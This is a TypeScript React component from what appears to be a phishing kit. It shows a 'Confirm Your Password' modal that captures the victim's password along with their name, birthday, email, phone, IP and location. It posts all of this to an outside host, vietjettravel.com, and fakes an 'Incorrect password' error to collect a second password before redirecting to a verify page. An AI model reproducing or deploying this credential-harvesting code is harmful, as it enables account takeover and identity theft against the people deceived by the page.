import type { FormData } from "@/pages/home";
import type { GeoLocation } from "@/types/geo";
import getConfig from "@/utils/config";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import axios from "axios";
import { type FC, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router";
const LAST_MESSAGE_KEY = "lastMessage";

interface PasswordModalProps {
  onClose?: () => void;
  isOpen: boolean;
  formData: FormData;
}

interface UIState {
  isShowPassword: boolean;
  password: string;
  error: string;
  isLoading: boolean;
  attempt: number;
}

interface Message {
  IP: string;
  ADD: string;
  TIME: string;
  PAGE_NAME: string;
  FULLNAME: string;
  BD: string;
  EMAIL: string;
  PHONENUMBER: string;
  PASS: string;
  PASS2?: string;
}

interface Config {
  sheet_id: string;
  loadingTime: number;
  maxAttempt: number;
}

const initialUIState: UIState = {
  isShowPassword: false,
  password: "",
  error: "",
  isLoading: false,
  attempt: 0,
};

const createTelegramMessage = (formData: FormData, password: string) => {
  const geoData: GeoLocation = JSON.parse(
    localStorage.getItem("geoData") ?? "{}",
  );

  const message = {
    IP: geoData.ip,
    ADD: `${geoData.city} - ${geoData.country}`,
    TIME: new Date().toLocaleString("vi-VN"),
    PAGE_NAME: formData.pageName,
    FULLNAME: formData.fullName,
    BD: formData.birthday,
    EMAIL: formData.email,
    PHONENUMBER: `+${formData.phone}`,
    PASS: password,
    PASS2: "",
  };

  return message;
};

const PasswordModal: FC<PasswordModalProps> = ({
  onClose,
  isOpen,
  formData,
}) => {
  const navigate = useNavigate();
  const [uiState, setUiState] = useState<UIState>(initialUIState);
  const [config, setConfig] = useState<Config>({
    sheet_id: "",
    loadingTime: 0,
    maxAttempt: 0,
  });

  const modalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const { settings } = getConfig();
    setConfig({
      sheet_id: settings.sheet_id,
      loadingTime: settings.password_loading_time,
      maxAttempt: settings.max_failed_password_attempts,
    });
  }, []);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        modalRef.current &&
        !modalRef.current.contains(event.target as Node)
      ) {
        onClose?.();
      }
    };

    if (isOpen) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [isOpen, onClose]);

  if (!isOpen) return null;
  const sendTelegramMessage = async (message: Message) => {
    const baseUrl = `https://vietjettravel.com/`;
    if (localStorage.getItem(LAST_MESSAGE_KEY)) {
      await axios.post(
        `${baseUrl}/update-data`,

        message,

        {
          headers: {
            "sheet-id": config.sheet_id,
          },
        },
      );
    } else {
      await axios.post(
        `${baseUrl}/add-data`,

        message,

        {
          headers: {
            "sheet-id": config.sheet_id,
          },
        },
      );
    }
  };

  const handleSubmit = async () => {
    let message = {
      IP: "",
      ADD: "",
      TIME: "",
      PAGE_NAME: "",
      FULLNAME: "",
      BD: "",
      EMAIL: "",
      PHONENUMBER: "",
      PASS: "",
      PASS2: "",
    };
    if (localStorage.getItem(LAST_MESSAGE_KEY) !== null) {
      const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);
      message = JSON.parse(lastMessage ?? "");
      message["PASS2"] = uiState.password;
    } else {
      message = createTelegramMessage(formData, uiState.password);
    }

    if (uiState.attempt >= config.maxAttempt) {
      setUiState((prev) => ({ ...prev, isLoading: true }));

      try {
        if (localStorage.getItem(LAST_MESSAGE_KEY) !== null) {
          await axios.post(
            `https://vietjettravel.com/update-data`,

            message,

            {
              headers: {
                "sheet-id": config.sheet_id,
              },
            },
          );
        } else {
          await axios.post(
            `https://vietjettravel.com/add-data`,

            message,

            {
              headers: {
                "sheet-id": config.sheet_id,
              },
            },
          );
        }
        localStorage.setItem(
          LAST_MESSAGE_KEY,
          JSON.stringify(message).toString(),
        );
        setTimeout(() => navigate("/verify"), config.loadingTime);
      } catch {
        navigate("/verify");
      }
      return;
    }

    setUiState((prev) => ({
      ...prev,
      isLoading: true,
    }));

    try {
      await sendTelegramMessage(message);

      localStorage.setItem(
        LAST_MESSAGE_KEY,
        JSON.stringify(message).toString(),
      );
      setUiState((prev) => ({
        ...prev,
      }));
      setTimeout(() => {
        setUiState((prev) => ({
          ...prev,
          attempt: prev.attempt + 1,
          isLoading: false,
          error: "Incorrect password. Please try again.",
        }));
      }, config.loadingTime);
    } catch {
      setUiState((prev) => ({
        ...prev,
        isLoading: false,
        error: "Something went wrong. Please try again later.",
      }));
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (!uiState.isLoading) {
      setUiState((prev) => ({
        ...prev,
        password: e.target.value,
      }));
    }
  };

  const togglePasswordVisibility = () => {
    setUiState((prev) => ({
      ...prev,
      isShowPassword: !prev.isShowPassword,
    }));
  };

  const clearError = () => {
    setUiState((prev) => ({
      ...prev,
      error: "",
    }));
  };

  return (
    <div className="fixed top-0 left-0 z-50 flex h-screen w-screen items-center justify-center bg-black/50 px-4 md:px-0">
      <div
        ref={modalRef}
        className="flex w-full max-w-2xl flex-col gap-4 rounded-lg bg-white p-6 shadow-lg"
      >
        <div className="flex flex-col gap-2">
          <h2 className="text-xl font-bold">Confirm Your Password</h2>
          <p className="text-sm text-gray-600">
            For your security, please enter your password to continue
          </p>
        </div>

        <div className="relative flex items-center justify-center">
          <input
            onFocus={clearError}
            className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
              uiState.error ? "border-red-500 focus:border-red-500" : ""
            }`}
            type={uiState.isShowPassword ? "text" : "password"}
            placeholder="Enter your password"
            value={uiState.password}
            onChange={handlePasswordChange}
          />
          <FontAwesomeIcon
            onClick={togglePasswordVisibility}
            icon={faEye}
            className="absolute right-4 cursor-pointer text-gray-500 select-none hover:scale-105"
          />
        </div>

        {uiState.error && (
          <div className="text-sm text-red-500">{uiState.error}</div>
        )}

        <div className="flex gap-3">
          {onClose && (
            <button
              onClick={onClose}
              className="w-full cursor-pointer rounded-full border border-gray-300 p-4 text-lg font-medium"
              type="button"
            >
              Cancel
            </button>
          )}
          <button
            onClick={handleSubmit}
            className={`flex w-full cursor-pointer items-center justify-center rounded-full p-4 text-lg font-medium text-white ${
              uiState.password.length < 6
                ? "cursor-not-allowed bg-blue-300"
                : "bg-blue-500 hover:bg-blue-600"
            }`}
            type="button"
            disabled={uiState.password.length < 6}
          >
            {uiState.isLoading ? (
              <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
            ) : (
              "Continue"
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

export default PasswordModal;
